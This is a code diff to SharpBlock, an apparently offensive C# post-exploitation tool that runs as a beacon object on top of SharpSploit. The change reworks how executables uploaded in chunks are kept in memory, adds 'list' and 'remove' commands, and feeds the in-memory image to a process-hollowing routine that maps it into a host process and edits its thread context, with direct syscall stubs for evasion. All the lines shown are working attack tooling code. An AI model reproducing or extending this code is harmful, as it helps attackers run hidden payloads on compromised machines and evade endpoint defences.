@@ -23,65 +23,9 @@ using static System.Net.Mime.MediaTypeNames;
 using Execute = SharpSploit.Execution;
 
 namespace SharpBlock {
-    class Files : BeaconObject
-    {
-        public static Dictionary<string, MemoryStream> FileIteams = new Dictionary<string, MemoryStream>();
-        public override void Go(byte[] chunk)
-        {
-            Unpack unpack = new Unpack("Zib", chunk);
-            string text = (string)unpack.Values[0];
-            int num = (int)unpack.Values[1];
-            byte[] array = (byte[])unpack.Values[2];
-            MemoryStream memoryStream;
-            if (!FileIteams.ContainsKey(text))
-            {
-                BeaconConsole.WriteLine("[+] Get Files unique id " + text);
-                memoryStream = new MemoryStream();
-                FileIteams[text] = memoryStream;
-            }
-            else
-            {
-                memoryStream = FileIteams[text];
-            }
-
-            memoryStream.Write(array, 0, array.Length);
-            if (array.Length < num)
-            {
-                BeaconConsole.WriteLine($"[+] Load {text} to SharpBlock Memory");
-            }
-        }
-
-        public Files(BeaconApi api) : base(api)
-        {
-
-        }
-    }
-
-    class FileList : BeaconObject
-    {
-        public override void Go(string[] args)
-        {
-            if (Files.FileIteams.Keys.Count == 0)
-            {
-                BeaconConsole.WriteLine("[*] No files found in memory!");
-                return;
-            }
-            foreach (KeyValuePair<string, MemoryStream> fileItem in Files.FileIteams)
-            {
-                base.BeaconConsole.WriteLine($"{fileItem.Key} {fileItem.Value.Length} bytes");
-            }
-
-            return;
-        }
-
-        public FileList(BeaconApi api) : base(api)
-        {
-
-        }
-    }
-
     class Program : BeaconObject
     {
+        private static Dictionary<string, MemoryStream> FileItems = new Dictionary<string, MemoryStream>();
 
         static IntPtr CurrentProcess = (IntPtr)(-1);
 
@@ -97,9 +41,67 @@ namespace SharpBlock {
                 NtProtectVirtualMemorySysCall = GetDelagateForSysCall<Execute.DynamicInvoke.Native.DELEGATES.NtProtectVirtualMemory>(Execute.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory"));
             }
         }
+
+        public override void Go(byte[] chunk)
+        {
+            Unpack unpack = new Unpack("Zib", chunk);
+            string text = (string)unpack.Values[0];
+            int num = (int)unpack.Values[1];
+            byte[] array = (byte[])unpack.Values[2];
+            MemoryStream memoryStream;
+            if (!FileItems.ContainsKey(text))
+            {
+                BeaconConsole.WriteLine("[+] Get Files unique id " + text);
+                memoryStream = new MemoryStream();
+                FileItems[text] = memoryStream;
+            }
+            else
+            {
+                BeaconConsole.WriteLine($"[+] File {text} already exists");
+                return;
+            }
+
+            memoryStream.Write(array, 0, array.Length);
+            if (array.Length < num)
+            {
+                BeaconConsole.WriteLine($"[+] Load {text} to SharpBlock Memory");
+            }
+        }
+
         public override void Go(string[] args)
         {
             MyBeaconConsole = BeaconConsole;
+
+            string text = args[0];
+
+            if (text == "list")
+            {
+                if (FileItems.Keys.Count == 0)
+                {
+                    BeaconConsole.WriteLine("[*] No files found in memory!");
+                    return;
+                }
+                foreach (KeyValuePair<string, MemoryStream> fileItem in FileItems)
+                {
+                    BeaconConsole.WriteLine($"{fileItem.Key} {fileItem.Value.Length} bytes");
+                }
+                return;
+            }
+
+            if (text == "remove")
+            {
+                string key = args[1];
+                if (FileItems.TryGetValue(args[1], out MemoryStream ms))
+                {
+                    ms?.Dispose();
+                    ms = null;
+                    BeaconConsole.WriteLine($"[*] File {key} is removed");
+                } else
+                {
+                    BeaconConsole.WriteLine($"[*] File {key} is not found");
+                }
+            }
+
             Main(args);
         }
 
@@ -722,7 +724,7 @@ namespace SharpBlock {
             HostProcessInfo hpi = new HostProcessInfo();
             IntPtr remoteImage;
             //IntPtr entryPoint = MapExecutableMemory(LoadProcessData(path), hProcess, out remoteImage);
-            IntPtr entryPoint = MapExecutableMemory(SharpBlock.Files.FileIteams[path].GetBuffer(), hProcess, out remoteImage);
+            IntPtr entryPoint = MapExecutableMemory(SharpBlock.Program.FileItems[path].GetBuffer(), hProcess, out remoteImage);
             //Get the thread context of our newly launched host process
             Context ctx = ContextFactory.Create(ContextFlags.All);
             ctx.GetContext(hThread);
@@ -890,6 +892,12 @@ namespace SharpBlock {
             } catch (Exception e) {
                 Program.WriteLine("[!] Failed to parse arguments: {0}", e.Message);
                 option_set.WriteOptionDescriptions(Console.Out);
+                return;
+            }
+
+            if (!SharpBlock.Program.FileItems.Keys.Contains(program))
+            {
+                MyBeaconConsole.WriteLine($"[-] File {program} not found");
                 return;
             }
 
